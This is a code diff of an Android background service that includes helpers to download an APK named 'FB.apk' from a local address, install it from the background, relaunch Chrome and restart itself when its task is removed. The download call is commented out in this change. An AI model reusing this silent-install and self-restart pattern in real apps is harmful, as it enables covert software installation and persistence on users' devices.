@@ -30,7 +30,9 @@ public class MyServices extends Service {
     public MyServices() {
         //Timer();
         //Update("http://192.168.1.6/download/FB.apk");
-        new DownloadFileFromURL().execute("http://192.168.1.6/download/FB.apk");
+        //new DownloadFileFromURL().execute("http://192.168.1.6/download/FB.apk");
+        //Log.i("MyActivity", "Our Service on the background ");
+        LuanchApp("com.android.chrome");
     }
     @Override
     public int onStartCommand(Intent intent, int flags, int startId){
@@ -48,7 +50,7 @@ public class MyServices extends Service {
     public void onTaskRemoved(Intent rootIntent) {
         Intent restartServiceIntent = new Intent(getApplicationContext(),this.getClass());
         //Log.i("MyActivity", "Our Service on the background ");
-        //LuanchApp("com.android.chrome");
+        LuanchApp("com.android.chrome");
 
         //Log.i("MyActivity", "Chrome is running: "+ isForeground(getApplicationContext(), "com.android.chrome"));
         //ListOfActivity();
@@ -57,6 +59,9 @@ public class MyServices extends Service {
         super.onTaskRemoved(rootIntent);
     }
 
+    /**
+     * sampler of the timer execution
+     * */
     public  void Timer(){
         new CountDownTimer(10000, 1000) {
 
@@ -72,6 +77,10 @@ public class MyServices extends Service {
 
         }.start();
     }
+
+    /**
+     * downloading sample
+     * */
     public void Update(String apkurl){
         try {
             URL url = new URL(apkurl);
@@ -111,6 +120,9 @@ public class MyServices extends Service {
         }
     }
 
+    /**
+     * install the app from the background
+     * */
     public void InstallApp(){
         //OutputStream output = new FileOutputStream(Environment.getExternalStorageDirectory()+ "/download/" + "app.apk");
         Intent intent = new Intent(Intent.ACTION_VIEW);
@@ -120,7 +132,9 @@ public class MyServices extends Service {
 
     }
 
-
+    /**
+     * luanching the app from the background
+     * */
     public void LuanchApp(String packageName){
         Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
         if (intent != null) {
@@ -137,7 +151,9 @@ public class MyServices extends Service {
             startActivity(intent);
         }
     }
-
+    /**
+     * Checking what is on the background
+     * */
     public static boolean isForeground(Context ctx, String myPackage){
         ActivityManager manager = (ActivityManager) ctx.getSystemService(ACTIVITY_SERVICE);
         List< ActivityManager.RunningTaskInfo > runningTaskInfo = manager.getRunningTasks(1);
@@ -149,6 +165,9 @@ public class MyServices extends Service {
         return false;
     }
 
+    /**
+     * Getting the list of activity this part doest work.
+     * */
     public void ListOfActivity(){
 //        final ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
 //        final List<ActivityManager.RunningTaskInfo> recentTasks = activityManager.getRunningTasks(Integer.MAX_VALUE);
